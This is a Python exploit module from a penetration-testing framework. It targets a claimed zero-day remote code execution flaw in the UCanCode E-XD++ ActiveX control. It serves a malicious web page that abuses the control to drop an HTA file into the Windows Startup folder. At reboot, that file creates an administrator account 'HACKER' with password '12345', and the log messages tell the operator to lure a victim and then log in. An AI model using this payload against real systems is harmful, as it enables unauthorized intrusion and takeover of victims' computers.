#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_ucancode_activex_rce"
INFO['DESCRIPTION'] = "UCanCode E-XD++ Visualization Enterprise Suite Remote Code Execution Vulnerability"
INFO['VENDOR'] = "http://ucancode.net/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
Tested on UCanCode E-XD++ Visualization Enterprise Suite V20.01  -- 2015 Vol.1
http://ucancode.net/Press%20Release/hmi-GIS-SCADA-Visualization-Report-Label-Print-vc-source-code.htm

Loaded File: C:\PROGRA~1\UCanCode Software\E-XD++ Visualization Enterprise Suite\Lib\UCCPrint.ocx
Name:        UCCPRINTLib
Lib GUID:    {4BD5B564-1A0E-4329-9F92-56D8228D1907}
Version:     10.0
Lib Classes: 12

Class UCCPrint
GUID: {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
Number of Interfaces: 1
Default Interface: _DUCCPrint
RegKey Safe for Script: True
RegKey Safe for Init: True
KillBitSet: False


The resulting file will lauch operating system commands at the next startup.
"""

INFO['CHANGELOG'] = "29 Nov, 2015. Written by Gleg team."
INFO['PATH'] = 'Exploits/Client_side/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["PORT"] = 80

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.state = "running"
        return
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        return
        
    def makesploit(self):
        return """
<html>
<object classid='clsid:A4FCBD44-6BF5-405C-9598-C8E8ADCE4488' id='obj' /></object>
<script language=vbscript>
Dim my
my ="<"
my=my & "SCRIPT> var x=new ActiveXObject('WScript.Shell'); x.Exec('net user HACKER 12345 /add /y');"
my=my & "x.Exec('net localgroup Administrators HACKER /add');<"
my=my & "/SCRIPT>"

obj.AddRectShape 0,0,100,100, my
obj.SaveToXdgFile "C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\starthack.hta"
</script>"""
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        self.log('Trick user to visit your ip via internet explorer to port ' + str(self.port))
        
        page = self.makesploit()
        answer = 'HTTP/1.1 200 OK\r\n'
        answer += 'Content-Length: ' + str(len(page)) + '\r\n'
        answer += 'Connection: close\r\n\r\n'
        answer += page
        answer += '\r\n'
        
        try:
            s = socket.socket()
            s.bind(('', self.port))
            s.listen(1)
            self.log('Waiting victim')
            conn, addr = s.accept()
            req = conn.recv(1024)
            self.log("Send evil page....")
            conn.send(answer)
            conn.close()
            self.log('Page uploaded')
            self.log()
            self.log('Now wait, until user reboot his system and use HACKER/12345 user/password to login')
            
            self.log("Finished this exploit")
            self.finish(True)
            return 1

        except:
            self.log("failed!")
            self.finish(False)
            return 0
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
